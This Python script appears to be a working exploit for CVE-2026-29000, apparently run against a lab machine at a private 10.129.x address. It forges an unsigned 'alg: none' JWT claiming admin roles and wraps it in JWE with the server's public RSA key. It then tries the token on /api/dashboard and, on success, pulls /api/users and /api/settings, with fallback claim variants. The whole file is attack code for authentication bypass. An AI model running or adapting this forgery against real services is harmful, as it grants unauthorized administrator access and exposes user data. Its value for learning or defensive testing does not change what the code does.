#!/usr/bin/env python3
"""CVE-2026-29000 — JWE-wrapped PlainJWT forge (Session 2 — trailing dot fix)"""

import json
import time
import base64
from jwcrypto import jwe, jwk

# Target
TARGET = "http://10.129.244.220:8080"

# JWKS RSA public key (kid: enc-key-1)
JWKS_DATA = {
    "kty": "RSA",
    "kid": "enc-key-1",
    "n": "lTh54vtBS1NAWrxAFU1NEZdrVxPeSMhHZ5NpZX-WtBsdWtJRaeeG61iNgYsFUXE9j2MAqmekpnyapD6A9dfSANhSgCF60uAZhnpIkFQVKEZday6ZIxoHpuP9zh2c3a7JrknrTbCPKzX39T6IK8pydccUvRl9zT4E_i6gtoVCUKixFVHnCvBpWJtmn4h3PCPCIOXtbZHAP3Nw7ncbXXNsrO3zmWXl-GQPuXu5-Uoi6mBQbmm0Z0SC07MCEZdFwoqQFC1E6OMN2G-KRwmuf661-uP9kPSXW8l4FutRpk6-LZW5C7gwihAiWyhZLQpjReRuhnUvLbG7I_m2PV0bWWy-Fw",
    "e": "AQAB"
}

def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('ascii')

def forge_token(sub="admin", enc="A256GCM"):
    """Forge JWE-wrapped PlainJWT with CORRECT 3-part format (trailing dot)."""

    # Step 1: Build PlainJWT with 3-part format per RFC 7519
    header = json.dumps({"alg": "none", "typ": "JWT"}, separators=(',', ':'))
    claims = json.dumps({
        "sub": sub,
        "$int_roles": ["ROLE_ADMIN"],
        "exp": int(time.time()) + 3600
    }, separators=(',', ':'))

    header_b64 = b64url_encode(header.encode())
    payload_b64 = b64url_encode(claims.encode())

    # CRITICAL: 3-part format with trailing dot (empty signature)
    plain_jwt = f"{header_b64}.{payload_b64}."

    print(f"[*] PlainJWT ({len(plain_jwt.split('.'))} parts): {plain_jwt[:80]}...")

    # Step 2: Load RSA public key
    pub_key = jwk.JWK(**JWKS_DATA)

    # Step 3: Wrap in JWE
    protected = {
        "alg": "RSA-OAEP-256",
        "enc": enc,
        "cty": "JWT"
    }

    token = jwe.JWE(
        plain_jwt.encode('utf-8'),
        recipient=pub_key,
        protected=json.dumps(protected)
    )
    jwe_token = token.serialize(compact=True)

    print(f"[*] JWE ({enc}): {jwe_token[:60]}...")
    return jwe_token


if __name__ == "__main__":
    import requests

    # Test matrix: sub variants x enc variants
    variants = [
        ("admin", "A256GCM"),
        ("admin", "A128GCM"),
    ]

    for sub, enc in variants:
        print(f"\n{'='*60}")
        print(f"[TEST] sub={sub}, enc={enc}")
        token = forge_token(sub=sub, enc=enc)

        headers = {"Authorization": f"Bearer {token}"}
        r = requests.get(f"{TARGET}/api/dashboard", headers=headers, timeout=10)
        print(f"[RESULT] {r.status_code} — {r.text[:200]}")

        if r.status_code == 200:
            print(f"\n[!!!] SUCCESS with sub={sub}, enc={enc}")
            print(f"[*] Dashboard response: {r.text[:500]}")

            # Hit other endpoints
            for ep in ["/api/users", "/api/settings"]:
                r2 = requests.get(f"{TARGET}{ep}", headers=headers, timeout=10)
                print(f"[*] {ep}: {r2.status_code} — {r2.text[:500]}")
            break
    else:
        print("\n[!] All primary variants failed. Testing backup claims...")

        # Backup: additional claims
        backup_variants = [
            ("admin", "A256GCM", {"iss": "principal-platform"}),
            ("admin", "A128GCM", {"iss": "principal-platform"}),
            ("administrator", "A256GCM", {}),
            ("administrator", "A128GCM", {}),
        ]

        for sub, enc, extra in backup_variants:
            print(f"\n{'='*60}")
            print(f"[BACKUP] sub={sub}, enc={enc}, extra={extra}")

            header = json.dumps({"alg": "none", "typ": "JWT"}, separators=(',', ':'))
            claims = {"sub": sub, "$int_roles": ["ROLE_ADMIN"], "exp": int(time.time()) + 3600}
            claims.update(extra)
            claims_json = json.dumps(claims, separators=(',', ':'))

            header_b64 = b64url_encode(header.encode())
            payload_b64 = b64url_encode(claims_json.encode())
            plain_jwt = f"{header_b64}.{payload_b64}."

            pub_key = jwk.JWK(**JWKS_DATA)
            protected = {"alg": "RSA-OAEP-256", "enc": enc, "cty": "JWT"}
            token = jwe.JWE(plain_jwt.encode('utf-8'), recipient=pub_key, protected=json.dumps(protected))
            jwe_token = token.serialize(compact=True)

            headers = {"Authorization": f"Bearer {jwe_token}"}
            r = requests.get(f"{TARGET}/api/dashboard", headers=headers, timeout=10)
            print(f"[RESULT] {r.status_code} — {r.text[:200]}")

            if r.status_code == 200:
                print(f"\n[!!!] SUCCESS with sub={sub}, enc={enc}, extra={extra}")
                for ep in ["/api/users", "/api/settings"]:
                    r2 = requests.get(f"{TARGET}{ep}", headers={"Authorization": f"Bearer {jwe_token}"}, timeout=10)
                    print(f"[*] {ep}: {r2.status_code} — {r2.text[:500]}")
                break
